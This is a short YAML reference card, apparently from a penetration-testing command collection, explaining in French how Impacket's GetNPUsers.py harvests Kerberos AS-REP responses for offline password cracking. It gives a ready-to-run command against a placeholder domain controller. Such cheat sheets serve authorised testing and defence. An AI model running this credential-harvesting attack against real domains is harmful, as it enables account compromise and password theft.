---
description: |
  GetNPUsers.py d'Impacket va tenter de récolter les réponses AS_REP nonreauth pour une liste donnée de noms d'utilisateurs. Ces réponses seront cryptées avec le mot de passe de l'utilisateur, qui peut alors être craqué hors ligne.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username List: usernames.txt

  	Output File: hashes.txt

command: |
  python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
items:
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
